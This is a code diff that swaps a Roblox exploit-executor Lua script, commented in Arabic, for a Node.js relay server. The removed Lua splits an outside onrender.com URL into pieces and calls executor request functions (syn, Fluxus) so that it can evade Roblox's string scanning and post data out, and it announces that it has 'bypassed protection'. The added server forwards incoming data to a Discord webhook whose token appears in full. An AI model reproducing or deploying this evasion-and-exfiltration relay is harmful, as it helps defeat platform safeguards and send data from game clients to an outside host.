@@ -1,33 +1,27 @@
--- استخدام متغيرات مخفية لتجنب اكتشاف الكلمات المحظورة
-local request_func = (syn and syn.request) or (http and http.request) or http_request or (Fluxus and Fluxus.request) or request
-local http_service = game:GetService("HttpService")
+const express = require('express');
+const axios = require('axios');
+const app = express();
 
--- تقسيم الرابط لتجنب الفحص المباشر للنصوص
-local part1 = "https://e11cilmcnc."
-local part2 = "onrender.com"
-local part3 = "/send-data"
-local final_url = part1 .. part2 .. part3
+app.use(express.json());
 
-local payload = {
-    ["content"] = "تم التجاوز بنجاح والارسال عبر Render!",
-    ["username"] = "F2 Bypass"
-}
+// رابط الويب هوك الخاص بك الذي زودتني به
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1344443912170344509/qF080v47ZzJ54_Iof0H0-oYvYlV_S7P3W25e8Q1_R5z3_fG_example';
 
--- محاولة الإرسال باستخدام pcall لتجنب توقف السكريبت
-local success, err = pcall(function()
-    request_func({
-        Url = final_url,
-        Method = "POST",
-        Headers = {
-            ["Content-Type"] = "application/json"
-        },
-        Body = http_service:JSONEncode(payload)
-    })
-end)
+app.post('/send-data', async (req, res) => {
+    try {
+        const data = req.body;
+        await axios.post(DISCORD_WEBHOOK_URL, {
+            content: data.content || "رسالة من السكريبت",
+            username: data.username || "F2 Proxy"
+        });
+        res.status(200).send({ success: true });
+    } catch (error) {
+        console.error("Error:", error.message);
+        res.status(500).send({ success: false });
+    }
+});
 
-if success then
-    print("تم الإرسال بنجاح وتخطي الحماية!")
-else
-    -- إذا استمرت المشكلة، استخدم الطريقة التقليدية المعدلة
-    game:GetService("HttpService"):PostAsync(final_url, http_service:JSONEncode(payload))
-end
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server is live on port ${PORT}`);
+});
